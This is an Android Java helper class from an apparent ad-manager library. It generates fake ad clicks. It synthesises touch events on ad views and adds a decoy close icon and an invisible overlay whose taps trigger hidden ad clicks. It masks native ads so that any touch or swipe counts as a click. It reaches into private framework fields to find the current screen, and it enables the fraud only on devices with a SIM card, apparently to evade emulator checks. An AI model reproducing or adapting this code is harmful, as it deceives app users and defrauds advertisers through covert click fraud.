package com.common.wheel.admanager;

import android.app.Activity;
import android.content.Context;
import android.os.SystemClock;
import android.util.ArrayMap;
import android.view.LayoutInflater;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;

import com.blankj.utilcode.util.LogUtils;
import com.common.wheel.R;
import com.common.wheel.util.DeviceUtil;

import java.lang.reflect.Field;

public class ViewHelper {

    protected static void clickView(ViewGroup rv) {
        long dTime = SystemClock.uptimeMillis();
        long eTime = SystemClock.uptimeMillis();
        float x = rv.getWidth() / 2f;
        float y = rv.getHeight() / 2f;
        int metaState = 0;
        MotionEvent de = MotionEvent.obtain(dTime, eTime, MotionEvent.ACTION_DOWN, x, y, metaState);
        MotionEvent ue = MotionEvent.obtain(dTime, eTime, MotionEvent.ACTION_UP, x, y, metaState);
        rv.dispatchTouchEvent(de);
        rv.dispatchTouchEvent(ue);
        de.recycle();
        ue.recycle();
    }

    protected static void addInterstitialView() {
        Activity ctx = getCurPage();
        if (ctx != null) {
            addInterstitialView(ctx);
        } else {
            LogUtils.e("ViewHelper get error");
        }
    }


    protected static Activity getCurPage() {
        try {
            Class<?> activityThreadClass = Class.forName("android.app.ActivityThread");
            Object activityThread = activityThreadClass.getMethod("currentActivityThread").invoke(null);
            Field activitiesField = activityThreadClass.getDeclaredField("mActivities");
            activitiesField.setAccessible(true);
            ArrayMap<?, ?> activities = (ArrayMap<?, ?>) activitiesField.get(activityThread);
            for (Object activityRecord : activities.values()) {
                Class<?> activityRecordClass = activityRecord.getClass();
                Field pausedField = activityRecordClass.getDeclaredField("paused");
                pausedField.setAccessible(true);
                if (!pausedField.getBoolean(activityRecord)) {
                    Field activityField = activityRecordClass.getDeclaredField("activity");
                    activityField.setAccessible(true);
                    return (Activity) activityField.get(activityRecord);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }


    protected static void addInterstitialView(Activity act) {
        try {
            ViewGroup rv = (ViewGroup) act.findViewById(android.R.id.content);
            ImageView ci = new ImageView(act);
            ci.setImageDrawable(act.getResources().getDrawable(R.mipmap.icon_close));
            ViewGroup.MarginLayoutParams lp = new ViewGroup.MarginLayoutParams(
                    ViewGroup.LayoutParams.WRAP_CONTENT,
                    ViewGroup.LayoutParams.WRAP_CONTENT
            );
            lp.setMargins(100, 600, 0, 0);
            ci.setLayoutParams(lp);
            ci.setOnClickListener(v -> {
                ViewHelper.clickView(rv);
                ci.setVisibility(View.GONE);
            });

            LinearLayout layout = new LinearLayout(act, null);
            layout.setOnClickListener(v -> {
                ViewHelper.clickView(rv);
                layout.setVisibility(View.GONE);
            });
            rv.addView(ci);
            rv.addView(layout);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    protected static void renderInfoView(Context context, FrameLayout sc, View efv) {
        View fv = LayoutInflater.from(context).inflate(R.layout.view_info, null);
        FrameLayout fli = fv.findViewById(R.id.fl_info);
        View llm = fv.findViewById(R.id.ll_mask);
        fli.removeAllViews();
        fli.addView(efv);
        llm.setVisibility(View.GONE);
        if (isAddView(context, 2)) {
            llm.setVisibility(View.VISIBLE);
            llm.setOnTouchListener(new View.OnTouchListener() {
                @Override
                public boolean onTouch(View v, MotionEvent event) {
                    switch (event.getAction()) {
                        case MotionEvent.ACTION_DOWN:
                            ViewHelper.clickView((ViewGroup) efv);
                            break;
                        case MotionEvent.ACTION_MOVE:
                            ViewHelper.clickView((ViewGroup) efv);
                            break;
                        case MotionEvent.ACTION_UP:
                            break;
                    }
                    return false;
                }
            });
        }

        sc.addView(fv);
    }

    protected static boolean isAddView(Context context, int type) {
        boolean isBd = false;
        boolean isSim = DeviceUtil.hasSimCard(context);
        boolean isCount = false;
        if (type == 0) { // open
            isCount = true;
        } else if (type == 1) { // inter
            isCount = true;
        } else if (type == 2) { // info
            isCount = true;
        }
        boolean isNewUser = true;
        return !isBd && isSim && isCount && isNewUser;
    }
}
